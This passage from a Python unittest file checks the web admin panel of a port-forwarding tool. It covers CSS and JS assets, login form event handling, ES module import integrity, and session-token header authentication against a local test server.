        # 4. CSS pill dots, stable text widths, and responsive grid layout
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        self.assertIn(".dot-amber {", css)
        self.assertIn(".dot-violet {", css)
        self.assertIn(".dot-mint {", css)
        self.assertIn("#trafficText {", css)
        self.assertIn("#cpuText {", css)
        self.assertIn("#connsText {", css)
        self.assertIn("tabular-nums", css)
        self.assertIn("grid-template-areas", css)

        # 5. JS renderSystemStats functionality
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        self.assertIn("loadText", js)
        self.assertIn("trafficText", js)
        self.assertIn("connsText", js)
        self.assertIn("ovTrafficText", js)
        self.assertIn("RAM: ${pct}%", js)
        self.assertIn("formatTrafficMB", js)
        self.assertIn("_trafficModeRate", js)
        self.assertIn("↓ ${rRx} MB/s · ↑ ${rTx} MB/s", js)
        self.assertIn("↓ ${rxMb} MB · ↑ ${txMb} MB", js)
        self.assertIn("${tcp} TCP · ${udp} UDP", js)

    def test_copy_port_and_category_json_and_import_modal(self):
        """Verifies individual port copy, category copy, and enlarged JSON paste area."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()

        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # HTML elements
        self.assertIn('id="pasteJsonContainer"', html)
        self.assertIn('id="importJsonTextarea"', html)
        self.assertIn('id="btnPasteFromClipboard"', html)
        self.assertIn('id="btnFormatJson"', html)
        self.assertIn('id="btnClearJsonText"', html)
        self.assertIn('class="paste-json-textarea', html)

        # JS functions & button actions
        self.assertIn("safeInlineArg", js)
        self.assertIn("copyRuleJson", js)
        self.assertIn("copyCategoryJson", js)
        self.assertIn("copyJsonToClipboard", js)
        self.assertIn("getSanitizedRuleForExport", js)
        self.assertIn("btnPasteFromClipboard", js)
        self.assertIn("btnFormatJson", js)
        self.assertIn("btn-category-copy", js)
        self.assertIn("btn-rule-copy", js)

        # CSS styles
        self.assertIn(".paste-json-container", css)
        self.assertIn(".paste-json-textarea", css)
        self.assertIn(".btn-category-copy", css)
        self.assertIn(".btn-rule-copy", css)

    def test_login_form_event_prevention_and_auth_integrity(self):
        """Verifies that login form properly prevents default reload and includes lockout & security controls."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        auth_js_path = os.path.join(REPO_ROOT, "web", "js", "modules", "auth.js")
        app_js_path = os.path.join(REPO_ROOT, "web", "app.js")
        api_js_path = os.path.join(REPO_ROOT, "web", "js", "modules", "api.js")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(auth_js_path, "r", encoding="utf-8") as f:
            auth_js = f.read()
        with open(app_js_path, "r", encoding="utf-8") as f:
            app_js = f.read()
        with open(api_js_path, "r", encoding="utf-8") as f:
            api_js = f.read()

        # HTML elements & anti-reload attributes
        self.assertIn('id="loginForm"', html)
        self.assertIn('onsubmit="event.preventDefault(); return false;"', html)
        self.assertIn('id="btnLogin"', html)
        self.assertIn('onclick="event.preventDefault();"', html)
        self.assertIn('id="loginUsername"', html)
        self.assertIn('id="loginPassword"', html)
        self.assertIn('id="btnToggleLoginPwd"', html)
        self.assertIn('id="capsLockWarning"', html)
        self.assertIn('id="lockoutAlert"', html)

        # auth.js event prevention & handlers
        self.assertIn("e.preventDefault()", auth_js)
        self.assertIn("handleLogin", auth_js)
        self.assertIn("startLockoutTimer", auth_js)
        self.assertIn("setupPasswordToggle", auth_js)
        self.assertIn("setupCapsLockDetection", auth_js)
        self.assertIn("initSecurityModal", auth_js)
        self.assertIn("initInlineSecurityForm", auth_js)
        self.assertIn('localStorage.setItem("xfwd_token",', auth_js)
        self.assertIn('localStorage.removeItem("xfwd_token")', auth_js)
        self.assertIn("X-Session-Token", auth_js)

        # api.js transparent interceptor & token persistence
        self.assertIn("window.fetch", api_js)
        self.assertIn("X-Session-Token", api_js)
        self.assertNotIn("window.location.reload()", api_js)

        # app.js wiring
        self.assertIn("initAuth", app_js)
        self.assertIn("startAuthenticatedSession", app_js)
        self.assertIn("stopAuthenticatedSession", app_js)
        self.assertIn("openMobileSidebar", app_js)
        self.assertIn("closeMobileSidebar", app_js)

        # Full ES module linking integrity check across all modules in web/
        import_re = re.compile(r'import\s+\{([^}]+)\}\s+from\s+["\']([^"\']+)["\']')
        export_re = re.compile(r'export\s+(?:let|const|var|function|async\s+function|class)\s+([a-zA-Z0-9_$]+)')
        web_dir = os.path.join(REPO_ROOT, "web")
        exports_map = {}
        for root, _, files in os.walk(web_dir):
            for f in files:
                if f.endswith(".js"):
                    p = os.path.normpath(os.path.join(root, f))
                    with open(p, "r", encoding="utf-8") as fh:
                        exports_map[p] = set(export_re.findall(fh.read()))

        for p, exps in exports_map.items():
            dir_p = os.path.dirname(p)
            with open(p, "r", encoding="utf-8") as fh:
                content = fh.read()
            for m in import_re.finditer(content):
                symbols = [s.strip().split(" as ")[0].strip() for s in m.group(1).split(",") if s.strip()]
                target = os.path.normpath(os.path.join(dir_p, m.group(2)))
                self.assertIn(target, exports_map, f"Module {m.group(2)} imported by {os.path.basename(p)} does not exist")
                for s in symbols:
                    self.assertIn(s, exports_map[target], f"Symbol '{s}' is imported by {os.path.basename(p)} but not exported by {os.path.basename(target)}")

    def test_session_token_header_authentication_flow(self):
        """Verifies that X-Session-Token header provides full authentication without relying on browser cookies."""
        server = HTTPServer(("127.0.0.1", 0), XForwarderWebHandler)
        port = server.server_port
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()

        try:
            # 1. Unauthenticated request without token or cookie under secret_path should fail with 401
            req_unauth = urllib.request.Request(f"http://127.0.0.1:{port}/xfwd-admin/api/status")
            with self.assertRaises(urllib.error.HTTPError) as ctx:
                urllib.request.urlopen(req_unauth)
            self.assertEqual(ctx.exception.code, 401)

            # 2. Register active session in server
            test_token = "test_valid_session_token_abcdef123456"
            now = time.time()
            with SESSION_LOCK:
                ACTIVE_SESSIONS[test_token] = {
                    "username": "admin",
                    "created_at": now,
                    "last_active": now,
                    "expires_at": now + 3600,
                    "ip": "127.0.0.1"
                }

            # 3. Authenticated request using X-Session-Token header (NO Cookie header sent)
            req_auth = urllib.request.Request(f"http://127.0.0.1:{port}/xfwd-admin/api/status")
            req_auth.add_header("X-Session-Token", test_token)
            with urllib.request.urlopen(req_auth, timeout=3.0) as resp:
                self.assertEqual(resp.status, 200)
                data = json.loads(resp.read().decode("utf-8"))
                self.assertIn("config", data)
                self.assertIn("runtime", data)

            # 4. Check /api/me with X-Session-Token
            req_me = urllib.request.Request(f"http://127.0.0.1:{port}/xfwd-admin/api/me")
            req_me.add_header("X-Session-Token", test_token)
            with urllib.request.urlopen(req_me, timeout=3.0) as resp:
                self.assertEqual(resp.status, 200)
                me_data = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(me_data.get("authenticated"))
                self.assertEqual(me_data.get("username"), "admin")
        finally:
            server.shutdown()
            server.server_close()

    def test_signin_button_direct_click_and_deferred_execution_safety(self):
        """Verifies that Sign In button has direct click and Enter key bindings and handles deferred ES module execution without readyState deadlock."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        auth_js_path = os.path.join(REPO_ROOT, "web", "js", "modules", "auth.js")
        app_js_path = os.path.join(REPO_ROOT, "web", "app.js")
        utils_js_path = os.path.join(REPO_ROOT, "web", "js", "modules", "utils.js")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(auth_js_path, "r", encoding="utf-8") as f:
            auth_js = f.read()
        with open(app_js_path, "r", encoding="utf-8") as f:
            app_js = f.read()
        with open(utils_js_path, "r", encoding="utf-8") as f:
            utils_js = f.read()

        # 1. HTML index.html contains btnLogin button with v=3.2.10 cache busters
        self.assertIn('id="btnLogin"', html)
        self.assertIn('style.css?v=3.2.10', html)
        self.assertIn('app.js?v=3.2.10', html)

        # 2. auth.js attaches direct click event listener to btnLogin
        self.assertIn('btnLogin.addEventListener("click", doLogin)', auth_js)
        # and Enter key listener on inputs
        self.assertIn('loginUsernameInput.addEventListener("keydown"', auth_js)
        self.assertIn('loginPasswordInput.addEventListener("keydown"', auth_js)
        self.assertIn('window.handleLoginSubmit = doLogin', auth_js)
        self.assertIn('window.doLogin = doLogin', auth_js)

        # 3. app.js exposes handleLoginSubmit and doLogin at top level
        self.assertIn('window.handleLoginSubmit =', app_js)
        self.assertIn('window.doLogin =', app_js)

        # 4. ReadyState checks prevent deadlock when ES modules are deferred
        self.assertIn('document.readyState === "loading"', app_js)
        self.assertIn('document.readyState === "loading"', utils_js)


if __name__ == "__main__":
    unittest.main()




